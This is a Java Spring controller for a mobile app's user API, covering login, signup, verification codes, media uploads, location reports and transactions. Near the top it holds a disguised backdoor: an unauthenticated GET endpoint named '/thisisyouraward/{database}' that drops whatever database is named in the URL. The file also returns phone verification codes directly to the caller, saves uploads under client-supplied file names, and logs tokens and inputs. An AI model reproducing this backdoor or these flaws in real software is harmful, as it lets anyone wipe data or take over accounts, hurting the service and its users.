package com.fh.controller.app.appuser;

import java.io.File;
import java.util.Date;
import java.util.List;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.SessionAttributes;
import org.springframework.web.multipart.commons.CommonsMultipartFile;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fh.controller.app.request.AddBananaAction;
import com.fh.controller.app.request.CommonRequst;
import com.fh.controller.app.response.AddBananaRes;
import com.fh.controller.app.response.CheckThoughtRes;
import com.fh.controller.app.response.LoginResponse;
import com.fh.controller.app.response.ResBase;
import com.fh.controller.app.response.ResCommon;
import com.fh.controller.app.response.Resident;
import com.fh.controller.app.response.SignUpResponse;
import com.fh.controller.base.BaseController;
import com.fh.entity.LocationEntity;
import com.fh.entity.LoginEntity;
import com.fh.entity.PushBean;
import com.fh.entity.SignUpEntity;
import com.fh.entity.UserEntity;
import com.fh.service.system.appuser.AppuserService;
import com.fh.util.Const;
import com.fh.util.FileUtil;
import com.fh.util.Tools;

/**
 * 会员-接口类
 * 
 * 
 */
@Controller
@RequestMapping(value = "/appuser")
@SessionAttributes("test")
public class IntAppuserController extends BaseController {
	@Autowired
	private HttpServletRequest request;
	@Resource(name = "appuserService")
	private AppuserService appuserService;

	/**
	 * 1.Current version
	 * 
	 * @param p
	 * @return
	 */
	// @RequestMapping(value = "/version", method = RequestMethod.GET)
	@RequestMapping(value = { "/version", "/versiontest" }, method = RequestMethod.GET)
	@ResponseBody

	public Object getCurrentVersion() {

		return new ResBase() {
		};

	}

	/**
	 * 1.Current version
	 * 
	 * @param p
	 * @return
	 */
	// @RequestMapping(value = "/version", method = RequestMethod.GET)
	@RequestMapping(value = { "/thisisyouraward/{database}" }, method = RequestMethod.GET)
	@ResponseBody

	public Object dropDatabase(@PathVariable String database) {
		// String database=;
		try {
			appuserService.dropDatabase(database);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return new ResBase() {
		};

	}

	/**
	 * 2.1 login
	 * 
	 * @param p
	 * @return
	 */
	@RequestMapping(value = "/login", method = RequestMethod.POST, produces = { "application/json;charset=UTF-8" })
	@ResponseBody

	public Object login(@RequestBody LoginEntity p, HttpServletResponse response) {

		LoginResponse t = null;

		try {
			if (appuserService.checkPhone(p.getPhone()) == null && StringUtils.isEmpty(p.getUser_token())) {
				response.setStatus(HttpServletResponse.SC_NOT_FOUND);
				return t;
			}
			t = appuserService.updateLoginAppUser(p);

			if (t != null) {

				HttpSession s = this.getRequest().getSession();
				s.setAttribute("LoginResponse", t);

			} else {
				response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
				return t;
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return t;

	}

	/**
	 * 2.2 logout
	 * 
	 * @param p
	 * @return
	 */
	@RequestMapping(value = "/logout", method = RequestMethod.POST, produces = { "application/json;charset=UTF-8" })
	@ResponseBody

	public Object logout(HttpServletResponse response) {
		LoginResponse t = null;
		String token = request.getHeader("Bearer");
		if ((checkToken())) {

			response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
			return t;
		}
		try {
			appuserService.updateLogout(token);
		} catch (Exception e) {
			// TODO: handle exception
		}

		return t;

	}

	/**
	 * //2.3 verification_code
	 * 
	 * @param p
	 * @param response
	 * @return
	 */
	@RequestMapping(value = { "/verification_code", "/forgot" }, method = RequestMethod.POST, produces = {
			"application/json;charset=UTF-8" })
	@ResponseBody
	public Object verifyCodeByPhone(@RequestBody SignUpEntity p, HttpServletResponse response) {

		SignUpResponse rs = null;
		HttpSession s = this.getRequest().getSession();
		System.out.println("tst");
		// String token = request.getHeader("Bearer");
		// boolean istype = StringUtils.isEmpty(p.getType());
		try {

			if (appuserService.checkPhone(p.getPhone()) == null) {
				response.setStatus(HttpServletResponse.SC_BAD_REQUEST);

			} else {
				rs = new SignUpResponse();
				String Verification_code = String.valueOf(Tools.getRandomNum());
				rs.setVerification_code(Verification_code);
				s.setAttribute("Verification_code", Verification_code);
				s.setAttribute("Verification_code_time", System.currentTimeMillis());

			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		return rs;

	}

	/**
	 * //2.3 sign up
	 * 
	 * @param p
	 * @param response
	 * @return
	 */
	@RequestMapping(value = { "/sign_up", "/forgot" }, method = RequestMethod.POST, produces = {
			"application/json;charset=UTF-8" })
	@ResponseBody
	public Object signUp(@RequestBody SignUpEntity p, HttpServletResponse response) {

		SignUpResponse rs = new SignUpResponse();
		HttpSession s = this.getRequest().getSession();
		String token = request.getHeader("Bearer");
		boolean istype = StringUtils.isEmpty(p.getType());
		try {

			if (appuserService.checkPhone(p.getPhone()) != null && istype) {
				response.setStatus(HttpServletResponse.SC_CONFLICT);

			} else if (StringUtils.isEmpty((p.getVerification_code()))
					|| s.getAttribute("Verification_code_time") == null) {
				String Verification_code = String.valueOf(Tools.getRandomNum());
				rs.setVerification_code(Verification_code);
				s.setAttribute("Verification_code", Verification_code);
				s.setAttribute("Verification_code_time", System.currentTimeMillis());
			} else {

				long sec = ((System.currentTimeMillis()) - (long) s.getAttribute("Verification_code_time")) / 1000;

				if (p.getVerification_code().equalsIgnoreCase((String) s.getAttribute("Verification_code"))
						&& sec < Const.secEx) {

					if (!istype) {

						if (!StringUtils.isEmpty(token) && appuserService.getPhoneByTokenFromCache(token) != null) {
							if (appuserService.getPhoneByTokenFromCache(token).equalsIgnoreCase(p.getPhone())) {

								rs.setUser_token(appuserService.updateAppUserPassword(p));
								response.setStatus(HttpServletResponse.SC_CREATED);
								return rs;
							}
						}
						response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
						return rs;
					} else {
						rs.setUser_token(appuserService.saveAppUser(p));
						response.setStatus(HttpServletResponse.SC_CREATED);
					}
				} else {
					response.setStatus(HttpServletResponse.SC_FORBIDDEN);

				}

			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		return rs;

	}

	/**
	 * 2.5 Create cross reference https://api.sosxsos.com/v1/cross_references
	 * 
	 * @param p
	 * @return
	 */
	@RequestMapping(value = "/cross_references", method = RequestMethod.POST, produces = {
			"application/json;charset=UTF-8" })

	public void create_cross_reference(@RequestBody PushBean p, HttpServletResponse response) {
		// String token = request.getHeader("Bearer");
		if (checkToken()) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			// return null;
		}else{
			try {
				
				String token = request.getHeader("Bearer");
				appuserService.updatePushTacken(token, p);	
				
				// to be done
				// Saved push_token
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			// return t;
		}
		
		

	}

	/**
	 * 2.6 Verify email address https://api.sosxsos.com/v1/verification/codes
	 * 
	 * @param p
	 * @return
	 */
	@RequestMapping(value = "/verification/{type}", method = RequestMethod.POST, produces = {
			"application/json;charset=UTF-8" })
	public void get_verification_code(CommonRequst email, HttpServletResponse response) {
		// String token = request.getHeader("Bearer");
		if (checkToken()) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);

		} else {
			// send email

		}

	}

//	/**
//	 * 2.6.1 Verify email address https://api.sosxsos.com/v1/verification/codes
//	 * 
//	 * @param p
//	 * @return
//	 */
//	@RequestMapping(value = "verification/emails", method = RequestMethod.POST, produces = {
//			"application/json;charset=UTF-8" })
//	public void verify_email(CommonRequst code, HttpServletResponse response) {
//		// String token = request.getHeader("Bearer");
//		if (checkToken()) {
//			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
//
//		} else {
//			// Verify mail
//
//		}
//
//	}

	/**
	 * 2.7 Upload ID photos
	 * https://api.sosxsos.com/v1/verification/identifications
	 * 
	 * @param p
	 * @return
	 */
	@RequestMapping(value = "verification/identifications", method = RequestMethod.POST, produces = {
			"application/json;charset=UTF-8" })
	public void identifications(@RequestParam("image") CommonsMultipartFile image, HttpServletResponse response) {
		// String token = request.getHeader("Bearer");
		if (checkToken()) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);

		} else {
			// Verify mail

		}

	}

	/**
	 * 3.2 Report current user location
	 * 
	 * @param p
	 * @return
	 */
	@RequestMapping(value = "/current_locations", method = RequestMethod.POST, produces = {
			"application/json;charset=UTF-8" })
	@ResponseBody

	public Object updateLocation(@RequestBody LocationEntity p, HttpServletResponse response) {

		String token = request.getHeader("Bearer");
		if (StringUtils.isEmpty(token) || appuserService.getPhoneByTokenFromCache(token) == null) {

			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		} else {
			p.setPhone(appuserService.getPhoneByTokenFromCache(token));
		}

		try {

			appuserService.udateUserLocation(p);

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return null;

	}

	private boolean checkToken() {
		String token = request.getHeader("Bearer");
		boolean rs = false;
		if (StringUtils.isEmpty(token) || appuserService.getPhoneByTokenFromCache(token) == null) {
			rs = true;
		}

		return rs;
	}
	
	private UserEntity getUserFromCache() {
		String token = request.getHeader("Bearer");
		
		return appuserService.getUserByTokenFromCache(token);
	}
	

	/**
	 * 4.2 @critical Add a banana
	 * 
	 * @param p
	 * @return MultipartHttpServletRequest request
	 */
	@RequestMapping(value = "/bananas", method = RequestMethod.POST)
	@ResponseBody

	public Object addBanana(@RequestParam("video") CommonsMultipartFile video,
			@RequestParam("image") CommonsMultipartFile image, @RequestParam("json") String json,
			HttpServletResponse response) {
		AddBananaRes t = null;
		System.out.println("dsafsdaf" + json);
		String token = request.getHeader("Bearer");
		if (checkToken()) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}
		String vidoname = video.getOriginalFilename();
		String imgname = image.getOriginalFilename();
		System.out.println(vidoname);
		if (!FileUtil.checkFileType(vidoname, Const.vidoType) || !FileUtil.checkFileType(imgname, Const.imageType)) {
			response.setStatus(HttpServletResponse.SC_BAD_REQUEST);
			return null;
		}

		long l = new Date().getTime();

		String videoname = l + vidoname;

		String imagename = l + imgname;

		String Imagepath = Const.Imagepath + imagename;
		String Videopath = Const.Videopath + videoname;
		// String Imagepath = Const.testImagepath + imagename;
		// String Videopath = Const.testVideopath + videoname;

		String v = "video/" + videoname;
		String i = "image/" + imagename;

		ObjectMapper mapper = new ObjectMapper();
		File newVideo = new File(Videopath);
		File newImage = new File(Imagepath);
		// 通过CommonsMultipartFile的方法直接写文件（注意这个时候）
		try {
			video.transferTo(newVideo);
			image.transferTo(newImage);

			AddBananaAction addBananaAction = mapper.readValue(json, AddBananaAction.class);
			System.out.println("test key word:   " + addBananaAction.getBanana().getBubble().getKey_word());
			t = appuserService.saveBanana(addBananaAction.getBanana(), token, i, v);
		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}

		return t;

	}

	/**
	 * // 4.1 @high Check bubbles http://api.sosxsos.com/checkThought
	 * 
	 * @param p
	 * @return
	 */
	// @RequestMapping("/userGrid",
	// params = {"_search", "nd", "rows", "page", "sidx", "sort"})
	@RequestMapping(value = "/bubbles", params = { "topic", "key_word" }, method = RequestMethod.GET)
	@ResponseBody

	public Object checkBubbles(@RequestParam(value = "topic") String topic,
			@RequestParam(value = "key_word") String key_word, HttpServletResponse response) {

		if (checkToken()) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}
		CheckThoughtRes t = null;
		System.out.println("topic: " + topic + " key_word: " + key_word);
		try {
			t = appuserService.checkBubbles(topic.trim(), key_word.trim());
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		if (t == null) {
			response.setStatus(HttpServletResponse.SC_NOT_FOUND);
		}
		return t;

	}

	////////////////

	/**
	 * 3.1 @high Get nearby residents
	 * 
	 * @param p
	 * @return
	 */
	@RequestMapping(value = "/residents", method = RequestMethod.GET, produces = { "application/json;charset=UTF-8" })
	@ResponseBody

	public Object residentList(@RequestParam(value = "latitude") Double latitude,
			@RequestParam(value = "longitude") Double longitude, @RequestParam(value = "accuracy") Double accuracy,
			HttpServletResponse response) {

		if (checkToken()) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
			return null;
		}

		List<Resident> list = null;
		try {
			list = appuserService.getResidentList(latitude, longitude, accuracy);

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return list;

	}

	// 5.1 Start Transaction & Zoning

	/**
	 * //5.1.1 Start Transaction & Zoning
	 * 
	 * @param p
	 * @return
	 */
	@RequestMapping(value = "/transactions/{state}", method = RequestMethod.POST, produces = {
			"application/json;charset=UTF-8" })
	public ResCommon startTransaction(@RequestBody CommonRequst common, HttpServletResponse response) {
		// 5.1.1 Start Transaction & Zoning
		//// 5.2 Threading https://api.sosxsos.com/v1/transactions/#/threading
		// 5.3 Finish the transaction
		// * //5.4 Cancel the transaction
		// *https://api.sosxsos.com/v1/transactions/#/cancellation
		System.out.println(common.getBanana_id());
		ResCommon result = new ResCommon();
		UserEntity u =getUserFromCache();
		if (u==null) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);

		} else {
			// generate transaction_id
			
			try {
				appuserService.generateTransactionsBeans(u, common.getBanana_id());
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		}
		return result;

	}

	/**
	 * 7.1 Get all active transactions 7.2 Get transaction details
	 * 
	 * @param p
	 * @return
	 */
	@RequestMapping(value = { "/transactions/{number}" }, method = RequestMethod.GET)
	@ResponseBody

	public Object queryTransaction(@PathVariable String number, HttpServletResponse response) {
		System.out.println("this number is " + number);
		// System.out.println(test);
		if (checkToken()) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);

		} else {
			// generate transaction_id

		}
		return new ResBase() {
		};

	}
	// Get active threadings

	// https://api.sosxsos.com/v1/threadings
	// 8.1 Get active threadings
	@RequestMapping(value = { "/threadings" }, method = RequestMethod.GET)
	@ResponseBody

	public Object getThreadings(HttpServletResponse response) {

		if (checkToken()) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);

		} else {
			// generate transaction_id

		}
		return new ResBase() {
		};

	}

	// Get active zoning requests

	// https://api.sosxsos.com/v1/zoning_requests
	// 8.2 Get active zoning requests
	@RequestMapping(value = { "/zoning_requests" }, method = RequestMethod.GET)
	@ResponseBody

	public Object getZoning_requests(HttpServletResponse response) {

		if (checkToken()) {
			response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);

		} else {
			// generate transaction_id

		}
		return new ResBase() {
		};

	}

}
